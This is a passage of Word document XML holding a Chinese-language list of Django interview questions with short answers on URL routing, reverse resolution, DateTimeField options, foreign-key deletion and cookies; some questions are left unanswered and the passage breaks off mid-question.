          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>里面的</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>url</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>有什么区别？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="147C826A" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00A52FA8" w:rsidRDefault="00717181" w:rsidP="00A52FA8">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A52FA8">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>2.0内的path匹配正则时候无效，导入re_path即可匹配正则         url = re_path</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07A3D349" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00A52FA8" w:rsidRDefault="00717181" w:rsidP="00A52FA8">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A52FA8">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>url()        是django.urls.re_path()别名       </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32ED4288" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00A52FA8" w:rsidRDefault="00717181" w:rsidP="00A52FA8">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A52FA8">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>url(regex, view, kwargs=None, name=None)[source]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44AEF472" w14:textId="5BA45E54" w:rsidR="00717181" w:rsidRPr="00A52FA8" w:rsidRDefault="00717181" w:rsidP="00A52FA8">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A52FA8">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>This function is an alias to django.urls.re_path(). It's likely to be deprecated in a future release.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="079C1130" w14:textId="4FA0DF08" w:rsidR="00717181" w:rsidRDefault="00A52FA8"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032</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>urlpatterns</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>中的</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>name</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>与</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>namespace</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>有什么作用？你是如何使用的？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="094C1EA8" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00A52FA8" w:rsidRDefault="00717181" w:rsidP="00A52FA8">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A52FA8">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>别名，给路由起一个别名</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7620B103" w14:textId="718C87FC" w:rsidR="00717181" w:rsidRPr="00A52FA8" w:rsidRDefault="00717181" w:rsidP="00A52FA8">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A52FA8">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>名称空间，防止多个应用之间的路由重复</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F33A7A4" w14:textId="3B5555FA" w:rsidR="00717181" w:rsidRPr="00325D76" w:rsidRDefault="00A52FA8"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033</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00717181" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>如何根据</w:t>
      </w:r>
      <w:r w:rsidR="00717181" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>urlpatterns</w:t>
      </w:r>
      <w:r w:rsidR="00717181" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>中的</w:t>
      </w:r>
      <w:r w:rsidR="00717181" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>name</w:t>
      </w:r>
      <w:r w:rsidR="00717181" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>反向生成</w:t>
      </w:r>
      <w:r w:rsidR="00717181" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>url,</w:t>
      </w:r>
      <w:r w:rsidR="00717181" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>这样反向生成</w:t>
      </w:r>
      <w:r w:rsidR="00717181" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>url</w:t>
      </w:r>
      <w:r w:rsidR="00717181" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>的方式有几种？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00EA907A" w14:textId="35F45E1F" w:rsidR="00717181" w:rsidRPr="00A52FA8" w:rsidRDefault="00717181" w:rsidP="00A52FA8">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A52FA8">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>使用HttpResponseRedirect</w:t>
      </w:r>
      <w:r w:rsidRPr="00A52FA8">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00A52FA8">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>redirect和reverse</w:t>
      </w:r>
      <w:r w:rsidRPr="00A52FA8">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00A52FA8">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>状态码：302,301</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="213AA978" w14:textId="711F91A8" w:rsidR="00717181" w:rsidRPr="00325D76" w:rsidRDefault="00467BDF"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036</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>DateTimeField</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>类型中的</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>auto_now</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>与</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>auto_now_add</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>有什么区别</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="628412DE" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00467BDF" w:rsidRDefault="00717181" w:rsidP="00467BDF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00467BDF">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>DateTimeField.auto_now</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FD4CA47" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00467BDF" w:rsidRDefault="00717181" w:rsidP="00467BDF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00467BDF">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>这个参数的默认值为false，设置为true时，能够在保存该字段时，将其值设置为当前时间，并且每次修改model，都会自动更新。因此这个参数在需要存储“最后修改时间”的场景下，十分方便。需要注意的是，设置该参数为true时，并不简单地意味着字段的默认值为当前时间，而是指字段会被“强制”更新到当前时间，你无法程序中手动为字段赋值；如果使用django再带的admin管理器，那么该字段在admin中是只读的。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2160FAC2" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00467BDF" w:rsidRDefault="00717181" w:rsidP="00467BDF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00467BDF">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>DateTimeField.auto_now_add</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E7DFD0F" w14:textId="4AFC9755" w:rsidR="00717181" w:rsidRPr="00467BDF" w:rsidRDefault="00717181" w:rsidP="00467BDF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00467BDF">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>这个参数的默认值也为False，设置为True时，会在model对象第一次被创建时，将字段的值设置为创建时的时间，以后修改对象时，字段的值不会再更新。该属性通常被用在存储“创建时间”的场景下。与auto_now类似，auto_now_add也具有强制性，一旦被设置为True，就无法在程序中手动为字段赋值，在admin中字段也会成为只读的。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="613C4268" w14:textId="6222C3DD" w:rsidR="00717181" w:rsidRDefault="00557AFE"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039</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>当删除一个外键的时候，如何把与其关联的对应关系删除</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FCC88DD" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00467BDF" w:rsidRDefault="00717181" w:rsidP="00467BDF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00467BDF">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>#删除关联表中的数据时,当前表与其关联的field的操作</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00A15A20" w14:textId="21A52E6E" w:rsidR="00717181" w:rsidRPr="00467BDF" w:rsidRDefault="00717181" w:rsidP="00467BDF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00467BDF">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>#django2.0之后，表与表之间关联的时候,必须要写on_delete参数,否则会报异常</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="581248DE" w14:textId="1F0658E6" w:rsidR="00717181" w:rsidRPr="00325D76" w:rsidRDefault="00B73D4C"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041</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>多对多关联的表，如何插入数据？如何删除数据？如何更新数据？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EFB548C" w14:textId="77777777" w:rsidR="00717181" w:rsidRDefault="00D96E02" w:rsidP="00717181">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:pict w14:anchorId="3A3A678C">
          <v:rect id="_x0000_i1026" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="61CD46B2" w14:textId="5E375E85" w:rsidR="00717181" w:rsidRPr="00325D76" w:rsidRDefault="00B73D4C"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045</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>如何给一个视图函数加上缓存？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B1E04B1" w14:textId="77777777" w:rsidR="00717181" w:rsidRDefault="00D96E02" w:rsidP="00717181">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:pict w14:anchorId="6DA346D0">
          <v:rect id="_x0000_i1027" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="70FBF0E8" w14:textId="5445EE66" w:rsidR="00717181" w:rsidRDefault="00B73D4C"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049</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Django App</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>的目录结构</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57B3B4D3" w14:textId="0DCB186F" w:rsidR="00717181" w:rsidRDefault="00717181" w:rsidP="00325D76">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4D12AAC8" wp14:editId="188B3187">
            <wp:extent cx="4705350" cy="43624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05350" cy="4362450"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="242CF465" w14:textId="77777777" w:rsidR="00717181" w:rsidRDefault="00D96E02" w:rsidP="00717181">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:pict w14:anchorId="602E8608">
          <v:rect id="_x0000_i1028" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="22D9410E" w14:textId="3106C3B3" w:rsidR="00717181" w:rsidRDefault="00B73D4C"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052</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>什么是</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Cookie</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、如何获取、设置</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Cookie</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03A17661" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00467BDF" w:rsidRDefault="00717181" w:rsidP="00467BDF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00467BDF">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>会话跟踪技术，保留用户</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="644714DE" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00467BDF" w:rsidRDefault="00717181" w:rsidP="00467BDF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00467BDF">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Cookie是由服务器创建，然?后通过响应发送给客户端?的一个键值对。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15F87A3E" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00467BDF" w:rsidRDefault="00717181" w:rsidP="00467BDF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00467BDF">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>具体一个浏览器针对一个服务器存储的key-value({ })</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78765E15" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00467BDF" w:rsidRDefault="00717181" w:rsidP="00467BDF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00467BDF">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>response.set_cookie("is_login",True) </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F7F2077" w14:textId="48C28834" w:rsidR="00717181" w:rsidRPr="00467BDF" w:rsidRDefault="00717181" w:rsidP="00467BDF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00467BDF">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>request.COOKIES.get("is_login")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DC97BCC" w14:textId="6519E3E4" w:rsidR="00717181" w:rsidRDefault="00B73D4C"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053</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>什么是</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>session</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>，与</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>cookie</w:t>
